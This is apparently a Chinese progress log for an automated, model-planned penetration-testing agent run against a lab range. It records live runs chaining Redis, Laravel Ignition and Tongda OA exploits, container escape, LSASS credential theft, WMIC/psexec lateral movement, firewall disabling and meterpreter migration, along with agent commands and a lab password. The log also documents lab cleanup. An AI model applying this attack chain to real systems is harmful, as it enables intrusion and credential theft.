- **PC1**：发现 D43 侦察遗留 `C:\agv_diag.txt`（`sc query` 输出，ERROR 1060）-> 已删；`ls C:/ | grep -i agv` 无残留；
  msf payload（sid 1-4 进程）保留为实验状态（随 suspend 冻结）。
- **两条通道实测教训**：meterpreter 命令通道不认 shell 命令（`type` -> `[-] Unknown command: type`，印证「shell 命令卡走 agent/webshell」条款）；
  反斜杠路径在 meterpreter 解析里会吃字符（`cat C:\a...` 找不到文件，`cat C:/a...` 正常）。

## 迁移后全图实机复验 · D51（2026-09-19）

12 张进攻/行动卡四段化迁移（r6b–r12，2026-09-18/19；迁移只动 SKILL.md 与 skill.json 的 desc/notes
文本）之后的第一次整图实机跑。口径：行为必须逐节点不变——用真实靶场证一遍「全图仍是 14/14 succeeded」。

### 0. 靶场与预检

六台 VM 启动（kali / Web1 / Web2 / PC1 / PC2 / DC）。预检（`output/diag/D32/preflight_d32h.py`）全绿：
五台 ping 全通；`web1:81 open`（HTTP 200）、`web2:6379 open`（`redis-cli ping → PONG`）、`pc1:8080 open`
（HTTP 200）、`pc1:445 open`、`dc:445 open`；`/tmp/agv-payloads/` 空、`http://192.168.52.30:8080/agv.shell.php`
= 404；`/opt/agv/tools/` 固定件在位。

### 1. 单节点链（迁移卡逐张实锤）

| run | 节点 | 卡 | 读数 |
| --- | --- | --- | --- |
| `L1-node14` | 14 | `pre.nmap_tcp_probe` | 6379 open（迁移后早批） |
| `L3-node12` | 12 | `exploit.redis_unauth_write` | 三闸 pass；key/value 经 `--node-context` 注入（见 §5） |
| `L4-node30` | 30 | `pre.nmap_tcp_probe` | 81 open |
| `L5-node28` | 28 | `exploit.laravel_ignition_rce` | 三闸 pass；容器内 `uid=33(www-data)` / `8e172820ac78` |

（`L2-node12` 的 `needs runtime values: key, value` 是 §5 补丁的起因，如实留档。）

### 2. 全图两跑（`run_agent.py --live`）

复现命令（同 D32h 口径）：

```
python scripts/run_agent.py --graph output/hongri7/json/Hongri7_v2.action_graph.json --run-dir output/runs/L6-live
  --remote kali@192.168.52.128 --password kali --assets data/inputs/hongri7/assets.json
  --host-map data/inputs/hongri7/host_ip_map.csv --control 192.168.52.128
  --node-context output/runs/D29-node-context.json --context @data/inputs/hongri7/run_context.domain_admin.json
  --timeout 60 --live
```

| run | 结果 | 时长 | 备注 |
| --- | --- | --- | --- |
| `L6-live` | **14/14 succeeded**（`every node is settled and every AND node succeeded`） | 73 s | node 48 先 wmic（unsatisfied）→ 环回 psexec |
| `L7-live2` | **14/14 succeeded** | 27 s | node 48 wmic 一次 pass |

供给链（两跑一致，实机动态）：`post.channel_echo`（pc1 通道）→ `session.webshell_via_laravel`
（容器内 shell）→ `session.root_via_suid`（容器内 root）；零 needs / 零 skill_gaps / 零 graph_gaps。

### 3. 现场故事：node 48 的一次方法否证与环回（`L6-live`）

- attempt-1 `exec.wmic_remote_cmd` → `unsatisfied`：`WMIC_RC=-2147023174`（RPC 服务器不可用）——PC2
  刚开机 WMI/RPC 未就绪；卡如实把错误写进 stdout，checker 按 identity 不达 tier 判停。
- 环回：`next_method` → attempt-2 `exec.impacket_psexec_cmd` pass（freshness / target / identity 三闸）。
- 两跑对比证明这是**环境瞬态**而非卡缺陷：`L7-live2` 里同一张卡一次通过。「多方法冗余、被否证的方法
  不否定节点」在实机上演一遍，两个方法各自的证据都留在 `node_result.json`。

### 4. 与 D32h-live3 基线的一致性

| 项 | `D32h-live3`（迁移前） | `L6-live` / `L7-live2`（迁移后） |
| --- | --- | --- |
| 节点 | 14/14 succeeded | 14/14 succeeded（逐行一致） |
| 方法（2 / 44 / 48） | firewall_wmi / wmi_probe / wmi_probe | netexec_firewall_off / wmic / wmic→psexec |

方法级差异属 D40–D50 批次的卡片扩充与命名演化（非本次文本迁移引入——迁移 diff 逐卡核对过）。

### 5. 运行面小补丁（`run_node.py --node-context`）

`L2-node12` 暴露：单节点 CLI 没有注入运行值的入口（`run_path.py` / `run_agent.py` 都有
`--node-context`）。补上同款语义（`merge_node_context`：该节点 id 下的值做选择上下文的最上层），
实机以 `L3-node12` 验证（`@output/runs/L3-node12/node-context.json`）。+5 条单测
（`tests/test_run_node_context.py`）。

### 6. 靶场清理（`output/diag/D51/cleanup_l6l7.py` + `D31/lab_cleanup_d31.py`）

- 容器：宿主 marker 删除、`/hello` 卸载、helper 删除、shell 删除 → HTTP 404 复核 ✓
- kali：`/tmp/agv-payloads`、agv-loot、recv log 清空 ✓
- redis（web1）：`agv*` 键清零（DBSIZE=0）、CONFIG dir/dbfilename 还原 ✓
- PC1：本机 Temp 4 个 `agv_*_wmic.txt` + 2 个 OA shell 文件（含更早批次遗留 1 个）删除；
  shell 文件 URL 复核 404（双证）✓
- DC / PC2：卡的远端自清生效（`\\…\c$\Windows\Temp\agv_*` 计数=0）✓
- 遗留观察项（如实）：PC1 Temp 删除的**计数复核**未做（清掉 shell 即断掉复核通道）；权限上下文与
  写入进程一致，下轮跑可顺带确认。

### 7. 回归

pytest **789 passed / 1 skipped**（迁移基线 784 + 5 新测）；CI 钩子 4/4 PASS。
## 七张 model 检查卡实机批次 · D60（2026-09-20）

目标：把 r2 落卡的 7 张 `model` 检查卡在红日 7 靶场上真跑一遍（判定由程序按卡 `judge` 执行），并把容器段既有方法复验。调用落在 `output/runs/D60-const-live1/` 与 `output/runs/D60-w4-live1/`（输入与提案在各自 `in/`；跑法 = `output/diag/D60/model_run.py run ... --proposal ... --requirement @... --host-map ...`）。

### 1. 七张检查卡 + 同批伙伴的判定

| 卡 | 靶机/对象 | 判定 | call_id | 一句证据 |
| --- | --- | --- | --- | --- |
| `pre.nmap_tcp_probe` | pc1:445 | pass | `call-20260920T174744-a60151` | 端口从声明 vantage 观测 open |
| `pre.service_version` | web1:6379 | pass | `call-20260920T174759-e78a9f` | 服务层识别 = redis，与叶期望一致 |
| `pre.credential_valid` | dc（域凭据） | pass | `call-20260920T180215-112e72` | 接受 + 观测特权 `NT AUTHORITY\SYSTEM` 满足叶 |
| `pre.credential_valid` | pc1（域凭据） | pass | `call-20260920T182831-6c315c` | 解析缺陷修复后的重验：`WHOAMIANONY\Administrator` 被接受 |
| `exploit.tongda_oa_include_rce` | pc1 OA | pass | `call-20260920T174811-ab6130-include` | 包裹块非空（通道建立） |
| `post.channel_echo` | pc1 通道 | pass | `call-20260920T174828-2e9546` | 回显 `PC1` / `nt authority\system`（三闸 pass） |
| `pre.netsecurity_firewall_state` | dc（叶期望 enabled） | **unsatisfied** | `call-20260920T180651-ed8545` | 三档 `Enabled=0`，与叶期望相反——判定正确工作、结论如实 |
| `pre.netsecurity_firewall_state` | pc1 | uncertain | `call-20260920T174835-6e340c` / `call-20260920T174859-8a1028` | 平台下限：旧版 PowerShell 无该 cmdlet（原始报错留档） |
| `pre.cim_process_info` | pc1（lsass） | pass | `call-20260920T180906-c6a2dd` | pid 500、owner `NT AUTHORITY\SYSTEM`（WMI 变体） |
| `pre.cim_process_info` | pc1（services） | pass | `call-20260920T180918-31eb33` | pid 492、SYSTEM |
| `pre.cim_process_info` | dc（services） | pass | `call-20260920T181021-72e771` | pid 456、SYSTEM |
| `pre.impacket_scm_query` | dc:445 | pass | `call-20260920T181047-f1a4e3` | SCMR 最小连接通过 + SCM owner 参考核对 |

（`credential_valid` 对 pc1 的前两次尝试是网络瞬态（NETBIOS 超时，`call-20260920T175139-806763` / `call-20260920T175321-5beb67`）；`cim_process_info` 对 pc1 的前两次尝试 `call-20260920T175003-e6b73b`（unsatisfied，缺 cmdlet 但模板回 `NO_PROCESS`）与 `call-20260920T180828-4b2a15`（uncertain，只解析出包装字段）——全部原件留档，不隐藏中间态。）

### 2. 容器段复验（Web2 / 容器）

| 段 | 卡 | 判定 | call_id | 一句证据 |
| --- | --- | --- | --- | --- |
| a1 | `session.webshell_via_laravel` | pass | `call-20260920T181555-a5a1e5` | 容器内 plain shell（www-data），探针回显 |
| a2 | `session.root_via_suid` | 通道建成；按节点绑定复判 pass | `call-20260920T181609-41de35` | 现场拿回 root；复判见 §5 |
| b1 | `pre.posix_path_access`（python 主模板） | uncertain | `call-20260920T181647-0034af` | 容器没有 python3（真实平台墙），如实不确定 |
| b1 | `pre.posix_path_access`（perl 变体） | pass | `call-20260920T182053-455f35` | root 主体 / `/tmp` 存在、write+search 成立 |
| b2 | `pre.docker_inspect`（首跑） | uncertain | `call-20260920T182117-5a7364` | target 闸缺宿主段观测 |
| b2 | `pre.docker_inspect`（复跑） | pass | `call-20260920T182139-e9d201` | 完整容器 ID 与宿主对齐 + 宿主侧绑定证据 |

### 3. 本批修掉的真实缺陷（均已落库）

1. **`DOMAIN\user` 域名解析缺陷**（`src/runtime/assembly.py::_parse_credential_valid`）：`rpartition` 取错段，把域名解析成账户名，让 effect 闸把一次真实接受读成「非本凭据的成功」。修复后同输入重验 pass（§1 第四行）；既有用例补域名断言。
2. **未声明材料输入不脱敏、不拆材料**（同文件 `param_rows` / `material_map`）：卡未声明的凭据型输入此前明文进 brief，且拼命令时把凭据引用整只 dict 拼进 argv（`firewall` 前两次尝试的原始 argv 里可见 `{"domain": …}` 进命令的痕迹）。现按形态识别 withheld，`material_map` 认 `dict.secret`；补测试。
3. **`[Console]::Out.Write` 出流**（`pre.cim_process_info` 卡面）：PowerShell 默认格式化器按控制台宽度折行，被折断的 JSON 解析不出；模板改为 `[Console]::Out.Write`（pc1 与 dc 两处实测）。

### 4. 平台下限与诚实口径

- `pre.netsecurity_firewall_state`：方法下限 = 目标 PowerShell 提供 `Get-NetFirewallProfile`。Windows 7 + PowerShell 2.0 没有该 cmdlet、也没有等价只读语义——卡面已写明「无等价语义时保持不确定」，不拿 `netsh`/注册表读数顶替证据形态。dc（Windows Server 2012）上查询与判定正常工作，`unsatisfied` 是**正确结论**（现场与叶期望相反），不是卡缺陷。
- `pre.posix_path_access`：容器（Debian 10 底）没有 python3——真实平台墙，不凑数；perl 变体先在 kali 上与 python3 主模板逐字段对照（euid / egid / 附加组 / `-w` / `-x` / errno 全一致）才落卡，再用真实 root 通道验证。
- `pre.docker_inspect`：`daemon_host_binding_ref` 拿不到就如实 uncertain；本次拿到（宿主本机 socket 绑定 + 宿主 hostname 对齐）。
- 网络瞬态：`pre.credential_valid` 对 pc1 的前两次尝试撞 `NETBIOS … timed out`，同参数连续重试恢复——如实留档为环境瞬态，不写成卡缺陷。

### 5. 容器段的节点绑定复判（a2）

`session.root_via_suid` 的现场调用（`call-20260920T181609-41de35`）未绑节点要求时原始判定为 `uncertain`（target / identity 闸无对照；原件保留）。按真实节点绑定复判：

```
python -B -X utf8 scripts/check_call.py \
  --call output/runs/D60-w4-live1/a2-suid/call-20260920T181609-41de35 \
  --node 22 --graph output/hongri7/json/Hongri7_v2.action_graph.json \
  --requirement "@output/runs/D60-w4-live1/in/req-w2docker.json" \
  --host-map data/inputs/hongri7/host_ip_map.csv --assets data/inputs/hongri7/assets.json
# => pass：freshness / target / identity 三闸全绿
```

（`req-w2docker.json` = `target_host: web2_docker` + 容器短/完整 ID 别名——容器短 id 与图主机的另一种拼写由 target 闸的运行时别名机制对齐。）

### 6. 状态与回归

- 7 张 `model` 检查卡 `planned → implemented`；卡面同步（5 张试点卡头部改 implemented、`pre.posix_path_access` 增补 perl 平台变体、`pre.netsecurity_firewall_state` 增补平台下限、`pre.service_version` / `pre.credential_valid` 末尾写入本批「实机验证记录」）。
- `skills/index.json`：`status_counts = {"implemented": 27, "planned": 5}`（剩余 planned：`session.msf_migrate`、`pre.tool_present`、`pre.session_identity`、`post.file_present`、`post.identity`）。
- 回归：pytest **849 passed / 1 skipped**；`scripts/ci.py` **4/4 PASS**。

## 五张 model 检查卡实机 + msf 迁移六步 + 全图合练 · D66（2026-09-20）

目标：收掉 D60 遗留的 5 张 `planned` model 卡（`pre.tool_present` / `pre.session_identity` / `post.file_present` / `post.identity` / `session.msf_migrate`），并把迁移卡的六步在真实会话上跑通。调用落在 `output/runs/D66-cards-live/`（输入与提案在 `in/`；跑法 = `output/diag/D60/model_run.py run ... --proposal ... --requirement @... --host-map ...`）。

### 1. 五张卡的判定（11 个场景：8 正例 + 3 负例）

| 卡 | 现场 | 判定 | call_id | 一句证据 |
| --- | --- | --- | --- | --- |
| `pre.tool_present` | 控制机（POSIX） | pass | `call-20260920T212124-0b0e0b` | `tool_path=/usr/bin/nmap` |
| `pre.tool_present` | pc1（cmd 通道） | pass | `call-20260920T214423-cac711` | 工具名解析到路径 |
| `pre.tool_present` | pc1（缺失负例） | **unsatisfied** | `call-20260920T214427-77c228` | 明确负事实，规则正确判不满足 |
| `pre.session_identity` | pc1（cmd 通道） | pass | `call-20260920T214444-df4719` | 身份 + 主机齐备（SYSTEM） |
| `post.file_present` | 控制机（POSIX） | pass | `call-20260920T214417-1a5892` | 40B + sha256 `c009875f…f6ee` |
| `post.file_present` | pc1（cmd 通道） | pass | `call-20260920T214428-2fb49c` | 65B（dir + 字节数） |
| `post.file_present` | pc1（缺失负例） | **unsatisfied** | `call-20260920T214429-fde712` | 路径不存在，明确负事实 |
| `post.identity` | 控制机（要求 system，负例） | **unsatisfied** | `call-20260920T214418-07f4bc` | 观测 user 级 < system，正确判不满足 |
| `post.identity` | 控制机（要求 user） | pass | `call-20260920T214417-1c7070` | 等级等价比较通过 |
| `post.identity` | pc1（要求 system） | pass | `call-20260920T214444-698070` | 观测 SYSTEM ≥ system |
| `session.msf_migrate` | pc1（msf 常驻端点） | pass | `call-20260920T212412-4da8b5` | 六步 v1；见 §2 |

中间态如实留档：控制机两张卡首跑 `uncertain`（`call-20260920T214317-86ca4a` / `call-20260920T214318-8defd3`，target 闸无主机观测），补 host 段后重跑通过；pc1 两张身份卡首跑 `uncertain`（`call-20260920T214427-3322ac` / `call-20260920T214429-e68068`，cmd 通道 `;` 不是分隔符、`whoami` 没执行），改 `&` 后重跑通过。

### 2. `session.msf_migrate` 六步（三跑，含一个禁区）

1. **建会话**：psexec 模块（域管凭据，域信任在本批修复）→ `sid=5`，SYSTEM。**v1 六步**（`sysinfo/getuid/ps/migrate 1152/sysinfo/getuid`）：迁移 `2580→1152`（spoolsv.exe）成功、后置 `getuid` 成功；但迁移后**立刻** `sysinfo` 报 `[-] stdapi_sys_config_sysinfo: Operation failed: The request is not supported`——扩展初始化窗口，后置探针顺序有讲究。判定 pass（`call-20260920T212412-4da8b5`）。
2. **第二跑（对照）**：迁 `winlogon.exe`（会话 1 系统进程）→ 命令超时（187s），**会话从端点消失**。禁区结论：不要迁会话 1 的 `winlogon`。
3. **评审升级 v2**：对照评审指出「迁移命令成功文案与旧宿主回显都不能证明宿主真的换了」→ 证据加 `getpid` 核对（后置 PID == 目标 PID 且 ≠ 迁移前），解析器新增 `session_host_pid` 字段（`Current pid` 读数），模板定为 `getpid/ps/migrate <pid> -t 60/getpid/sysinfo/getuid`，后置三连留序列末尾（转录无 marker，解析取**最后一次**读数）。复跑：`3264→1152` 迁移成功，后置 `getpid/sysinfo/getuid` 全回显、tier 核对通过（`call-20260920T214248-ad3f28`，pass）。

### 3. 本批修掉的真实缺陷（均已落库）

1. **host 段锚定**（D1 通道）：`post.*` 卡的 target 闸需要主机观测，而 D1 包装不带 host 段（D2/D3 才有）——装配答案补 `; echo <marker>host ; hostname`（host 段放尾部，别吞掉 head 段的大小/摘要解析）。host-map 补 `kali,192.168.52.128` 行（观测名对齐 IP 目标）。
2. **cmd 通道分隔符**：`echo <marker>user ; whoami` 在 cmd 里整行被当字面量输出——身份探针在 cmd 通道用 `&` 串联（POSIX 才用 `;`）。
3. **msf 解析器收紧**：`Computer` / `Server username` 正则从 `\s*` 改 `[ \t]*`（`\s` 跨行会吞下一字段）并锚行尾；新增 `Current pid` → `session_host_pid`（取最后一次读数，对应模板后置位）。
4. **迁移计划状态防漂移**：`session_agent.plan_migration` 的 `status` 改为直接读卡状态（此前写死 "planned"）。
5. **迁移卡 v2 卡面**：加 `getpid` 核对、`-t 60` 预算、失败收尾口径（迁移明确报错即便复探齐全也不覆盖）、`sleep` 禁令（该命令会掐断传输）、`winlogon` 禁区。

### 4. 状态与回归

- 5 张卡 `planned → implemented`；全库 32/32 implemented（`skills/index.json` 重建，`status_counts = {"implemented": 32}`）。
- 试点卡（`pre.tool_present` / `session.msf_migrate`）实机锚点按既有裁定进库外索引（`docs/product/adoption_evidence.tsv`）；其余 3 张卡面「实机验证记录」段就位。
- 回归：pytest **849 passed / 1 skipped**；`scripts/ci.py` 4/4 PASS。

### 5. 全图打穿合练 · L8（2026-09-20）

验收口径：全图 14 节点一次跑完 `run: succeeded via done_all`——planner 自主选步、逐节点真实执行 + 三闸判定，零 needs / 零 skill_gaps / 零 graph_gaps。跑法（同一命令两跑，`--timeout 60` 与首跑的 60s 超时读数吻合）：

```console
scripts\run_agent.py --graph output\hongri7\json\Hongri7_v2.action_graph.json --run-dir output\runs\L8-live2 ^
  --remote kali@192.168.52.128 --password kali --assets data\inputs\hongri7\assets.json ^
  --host-map data\inputs\hongri7\host_ip_map.csv --control 192.168.52.128 ^
  --node-context output\runs\D29-node-context.json --context @data\inputs\hongri7\run_context.domain_admin.json ^
  --timeout 60 --live
```

**首跑**（`output/runs/L8-live/`，21:45:15 → 21:49:55，280s，13 次调用）：`run: blocked via blocked`——11 succeeded / 1 blocked / 2 uncertain，两个环境缺口：

- **node 28**（Laravel Ignition，target `web2_docker`）uncertain：`http://192.168.52.10:81` 回 **502 Bad Gateway**（Web2 虚拟机没开机、发布口后面没有后端）——effect 闸如实判不确定（`call-20260920T214519-3f14fe`）。
- **node 48**（pc1→pc2 wmic）uncertain：PC2 虚拟机没开机。候选按序试满 4 个：wmic ×2 各 60s 超时（`…T214712-5974d1` / `…T214812-3c104d`）、`exec.impacket_psexec_cmd` 与 `exec.impacket_wmiexec_cmd` 快速失败（rc=1，无 target 观测）。node 47（OR 聚合）随之 `or_unmet`（its providers all closed without proving 47）。
- 同跑前半段还留了两条 `needs`（node 26 / 22 的会话供给当时没挂上——Web2 起来之前 `session.webshell_via_laravel` 判过一次不确定），后段供给链补上、两节点在同跑内成功；如实留档。

**环境补齐**：`vmrun -T ws start "<Web2 的 vmx>" nogui`、`…"<PC2 的 vmx>" nogui`（vmx 原文路径见 work 仓 PROGRESS 同轮条目）。

**复跑**（`output/runs/L8-live2/`，21:52:40 → 21:53:05，25s，10 次调用）：**`run: succeeded via done_all`，14/14 succeeded**。选步顺序：14 → 5(skip) → 12 → 7 → 19(skip) → 2 → 30 → 28 → 26 → 22 → 44 → 43(aggregate) → 48 → 47(aggregate) → done_all。

| 节点 | 图上规则 | 落法 | 卡 | call_id |
| --- | --- | --- | --- | --- |
| 14 | RULE 1 Direct Network Access（web1:6379） | 真跑 | `pre.nmap_tcp_probe` | `call-20260920T215240-c422ce` |
| 30 | RULE 1 Direct Network Access（web2_docker:81） | 真跑 | `pre.nmap_tcp_probe` | `call-20260920T215244-9e7923` |
| 12 | RULE 4 Exploit Public-Facing（web1 redis） | 真跑（key/value 由 node-context 注入） | `exploit.redis_unauth_write` | `call-20260920T215240-78e4e0` |
| 7 | RULE 21 Command & Scripting（pc1 通da OA） | 真跑（include 回显 `nt authority\system`） | `exploit.tongda_oa_include_rce` | `call-20260920T215240-bd780b-include` |
| 2 | RULE 12 Impair Defenses（dc 防火墙） | 真跑（域管凭据 + smbexec 关三档） | `evasion.netexec_firewall_off` | `call-20260920T215242-56872d` |
| 28 | RULE 4 Exploit Public-Facing（web2 Docker Laravel） | 真跑（容器内 www-data 回显） | `exploit.laravel_ignition_rce` | `call-20260920T215244-6c0471` |
| 26 | RULE 19 Path Interception（web2_docker SUID） | 真跑（SUID 劫持拿到 root） | `priv.suid_path_hijack` | `call-20260920T215245-6e903e-run` |
| 22 | RULE 20 Privilege Escalation（web2 特权容器逃逸） | 真跑（逃逸回宿主） | `priv.privileged_container_escape` | `call-20260920T215248-b4311c` |
| 44 | RULE 32 Remote Services（pc1→dc:445） | 真跑（cmd 通道 + wmic 远程命令） | `exec.wmic_remote_cmd` | `call-20260920T215248-fe2abc` |
| 48 | RULE 30 Remote Services（pc1→pc2:445） | 真跑（8.6s 一次通过） | `exec.wmic_remote_cmd` | `call-20260920T215257-f826ac` |
| 5 | RULE 6 LSASS 凭证窃取（pc1） | skip（其产出的域管凭据事实在输入侧已成立） | — | — |
| 19 | RULE 21 Command & Scripting（pc1 通da OA 的第二生产者） | skip（效果已被 node 7 证明） | — | — |
| 43 / 47 | OR 聚合（execCode(dc / pc2, system)） | aggregate（上游证明后无动作结算） | — | — |

- 三条供给链随图跑通：`post.channel_echo`（node 2 → PC1 cmd 通道，`call-20260920T215241-580ec5`）/ `session.webshell_via_laravel`（node 26 → 容器会话，`call-20260920T215244-cd8c80`）/ `session.root_via_suid`（node 22 → root 会话，`call-20260920T215248-a014f5`）。
- node 5 的 skip 是 planner 的正常短路（凭据事实已由输入成立），与 LSASS 链本身的实机验证不冲突——LSASS 取证链在 D60 单独验过（07b `pre.cim_process_info` 的 lsass 调用，`call-20260920T180906-c6a2dd`）。

**收尾（验完复位）**：

- node 2 真在 DC 上关了三档防火墙；合练后立刻用同一域管凭据执行 `netsh advfirewall set allprofiles state on` 复原，`netsh advfirewall show allprofiles state` 复核三档「启用」（复核记录落在库外 `output/diag/D60/recovery_20260920.md`）。
- kali 侧：8765 端口的 `http.server` 收工、`/tmp/agv-xfer` 删除（`/tmp/agv-payloads` 留着，四条通道依赖它）；msf 端点会话随用随建——D66 迁移验证建的 `sid=6` 在合练后 `exit`，`session-list` 复核 `(no sessions)`。
- PC1 侧：`C:\Windows\Temp\netdom.exe`（信任修复工具）与 5 个 `agv_agv*_wmic.txt` 已删；`dir %windir%\*.exe` 与最近创建文件清单复核无残留 payload。

## 规划管道真跑 · run85（2026-09-21，真实模型接口）

先说口径：这一节记的是**编排管道**的真跑，不是目标效果验收——没有任何目标调用、没有节点成功提交、
没有全图验收结论。索引表里这两条（`E129`/`E130`）机械落在 **C**（没有结构化判定记录）并带 `dry run` 标注；
这里的 dry run 指「没有目标执行」，不代表没有真实模型调用，也不能把这两条当成节点效果证据。

- 入口：`scripts/run_planning_pipeline.py`（TXT＋主机映射表 → 出图 → 规划器 → 程序采用检查 → E1 材料）
- 代码版本：首次真跑在 99c52ef 工作树；修补后复跑与已提交代码一致（**7c453b6**）
- 环境：Windows 11 10.0.26200 / Python 3.12.4（`D:\Conda\python.exe -B -X utf8`）；离线守线 pytest 1052 passed / 1 skipped、`scripts/ci.py` 4/4
- 模型口径：`--model-base-url https://api.deepseek.com`、`--model deepseek-chat`（回包 model=deepseek-flash）、`--model-timeout 90`、客户端 retries=0；
  传输凭据只从环境变量读，命令行与全部产物都不含它
- 四份输入（sha256 前 16）：Hongri7_v2.txt 732f7995d9b9a4b3 / host_ip_map.csv 53dab410c2cbb7f7 / assets.json a05c6035a087accd / run_context.domain_admin.json 3cd87dfee4214192

| run | 规划（模型） | 采用 | E1 材料 | 关键产物（sha256 前 16） |
| --- | --- | --- | --- | --- |
| `r85-p1` | continue 节点 14（source=model，875ms，tokens 11641/17） | 通过（ready 集 {14,30}） | ready / 节点 14 / 1 叶卡 / gaps 0 | graph 457c3dbd…（41940B）、planner.input 1d5934aa…、e1.input 5bae491e…、e1.materials cb681b0b…、转录 499d81d3… |
| `r85-p2` | continue 节点 14（719ms，同 tokens） | 通过 | ready / 节点 14 / 同卡 / gaps 0 | graph 5f5ff61f…（41940B）、planner.input 7cd4c244…、e1.input 3ecb3c25…、e1.materials e42436fc…、转录 6e29c881… |

- 复跑保护：同 `--run-dir` 不覆盖——第二次调用同目录返回 FileExistsError、退出码 2；`r85-p1` 目录逐文件复核未见改写。
- 图语义：两个 run 的图与 `output/hongri7/json/Hongri7_v2.action_graph.json` 在 nodes / summary / final_goal 上全等；
  只有 `inputs.*.file` 的显示路径不同（各 run 自己的输入快照路径）。
- 敏感值：转录里传输凭据前缀零命中；运行上下文的口令值在提示词里只以占位符出现（明文零命中）。
- 停止与缺口路径不在本表：由离线用例守（无可用节点 → 本地停止且不调用模型；坏计划不进 E1；记录写失败撤销采用；受控空注册表下缺口原样留存）。
- 再演一遍的前提：同版本 + 同四份输入 + 模型环境变量就位；模型可任选当次的合法 ready 节点，不要求重复选 14。

## 单节点 E2 事务与中断恢复 · run87（2026-09-22）

结论：真实模型一次生成完整 checks，单叶真实 pre 完成执行及证据发布；控制进程在 TxReceipt 后中断，
显式 recover 完成判定提交，结果为 pre_satisfied。入口止于 E2，不进入 E3，不提交节点成功。

索引表：`adoption_evidence.tsv` 收录 `E131`，机械落 **B**（outcome `verdicts pass=1`，notes
`no run-level result (call judgements only)`，不标 dry run）——B 只是索引识别范围的产物
（生成器目前只认旧 `run_result.json` 的运行级结果），不影响本节 E2 结论。

- 代码：e94dc97e1c8afd0ac6749228b4b8c5d09bee5290。源码树摘要、输入摘要及执行端实例绑定见本轮 binding.json。
- 消费目录：output/runs/r87-e2-node14/。原 run_id=r85-p1，node_id=14；call_id=call-e2001-7e6ee4e1f699。
- 控制端：Python 3.12.4、SQLite 3.45.3。执行端：Python 3.11.6、SQLite 3.43.2、nmap 7.93。
- 模型：deepseek-flash，https://api.deepseek.com，timeout=60，retries=0；凭据由 AGV_MODEL_API_KEY 环境变量提供。
- 现场记录：install → 故障注入 run → recover。切点为 Kernel.collect() 成功返回后，控制进程 exit 73；
  恢复前 acceptance/receipt/verdict=1/1/0，recover exit 0。中断退出码和恢复前数据库状态引用当时终端记录。
- 当前产物：模型转录唯一；recovery-001.json 为 pre_satisfied；judgement 的 freshness、target、effect 三闸均 pass；
  SQLite 当前 acceptance/receipt/verdict=1/1/1。
- 观测：`pre.nmap_tcp_probe`，从 kali@192.168.52.128 观测 192.168.52.10:6379，state=open，state_reason=syn-ack。
- 完整性复核：binding 所列 7 份输入摘要匹配；receipt 所列 7 份文件长度及摘要匹配；
  请求摘要、执行端 manifest、本地回执及数据库记录一致。
- 离线验证：1069 passed / 1 skipped，ci 4/4 PASS（落码方本轮运行记录；此次只读复核未重新执行）。

覆盖边界：本次真实验证 TxReceipt 已提交、TxVerdict 未提交的恢复分支。同摘要重复 execute、异摘要冲突按离线测试登记；
端点 unknown 的生产恢复停发尚未真跑验收。

再演：recover 原目录复用原调用。仅更换消费目录、仍消费同一 r85-p1，不会获得新的调用身份；
新的真实执行须来自新的合法采用。

关键文件 SHA256：

```text
receipt.json
136ea1ffe2926e35b459728f5ae83986832e9c4d66b17aa04833300edd75339e

recovery-001.json
e0c316e9364bb5529149e0b43db6a4834d0dc6356075bff88b7a9a5a51e4fafe
```

## 单节点 E2 三阶段（pre/action/post）编排 · run89（2026-09-22）

结论：真实执行端上，单叶三阶段各完成一次持久调用；action 只留完整回执与结算、不写成功判定；
pre / post 判定 satisfied；三条调用全部结算（settled）；两次显式恢复均 pre_satisfied 且未重打。
入口止于内核编排，不产生节点结论，不提交节点成功。

索引表：`adoption_evidence.tsv` 收录 `E132`，机械落 **B**（outcome `verdicts pass=2`，notes
`no run-level result (call judgements only)`）——B 只是索引识别范围的产物（生成器目前只认旧
`run_result.json` 的运行级结果），不影响本节三阶段结论。

- 代码：8f86c496c60d7b3886403bb32cec314a0a5cbca7。源码树摘要、输入摘要及执行端实例绑定见本轮 binding.json。
- 消费目录：output/runs/r89-e2-node14-3phase/。原 run_id=r85-p1，node_id=14；三段 call_id：
  call-e2001-7e6ee4e1f699（pre）、call-e3001-baa609707e7b（action）、call-e4001-9180af1450f7（post）。
- 控制端：Python 3.12.4、SQLite 3.45.3。执行端：Python 3.11.6、nmap 7.93；新注册实例（output/e2-endpoint-r89.json）。
- 模型：本演练为主题内核级驱动（不使用模型），三段请求由固定卡（pre.nmap_tcp_probe）＋程序绑参生成。
- 现场记录：install → 三段执行 → recover ×2。三段 dispatch 退出码均 0；验收后三条 settlement 齐；
  action 的 verdict 为空（实施失败与否归后校验，本轮不含）。
- 幂等复核：两次恢复后各 call.json 的 started_at 与 stdout 长度不变（未重打）；恢复退出码 0（pre_satisfied）；
  recovery-002 的 observations 为空（无 query；回执已在本地）。
- 观测：`pre.nmap_tcp_probe`，从 kali@192.168.52.128 观测 192.168.52.10:6379，state=open，state_reason=syn-ack。
- 离线验证：1085 passed / 1 skipped，ci 4/4 PASS（落码方本轮运行记录）。

覆盖边界：本演练覆盖三阶段准入、结算与恢复幂等的主干；E3/E4 的模型入口（单候选生成与后校验入口）
尚待在后续批次落码后真跑；端点 unknown 的生产恢复停发尚未真跑验收。

关键文件 SHA256：

```text
call-e2001-7e6ee4e1f699/receipt.json
230e81f80a7acc10f94eed0363fc729b567c9635e8f52ba6e75a945b9e60e14e

call-e3001-baa609707e7b/receipt.json
46d5dfa1202bf00a958614b14b7d2a3902f16ea2ab8cc9d2b29019abcb7131f0

call-e4001-9180af1450f7/receipt.json
acec59a2991592a2eaddc7387f98113c28ef3f7aa4e2dfc72badc491960a590e

recovery-002.json
79f9dee00ca84c21d07398e9ddc7e9d1c1e4ecccb50d561f3b7f02c07b8c4a3c
```

## 单节点 E2 真实 unknown 停发 · run90（2026-09-22）

结论：演练执行端在「结果发布前」真实退出（exit 74）后，真实 query 如实落到 unknown；
两次显式恢复都只查询、不重打（远端 child_started／child_reaped 各 1 次），恢复以 exit 2 停止、当前叶 `uncertain`；
停发成立：后续 pre／post 派发被「an earlier call is unresolved」挡住。不伪造 receipt／verdict，不提交节点成功。

- 代码：2c5e8b55bd40a5c2b644b0dfeb8e9015471d5c3f（本节演习早于 26a9f17 的三处内核修补；口径不依赖该修补）。
- 消费目录：output/runs/r90-unknown-pre/。原 run_id=r85-p1，node_id=14；call_id=call-e2001-7e6ee4e1f699（pre）。
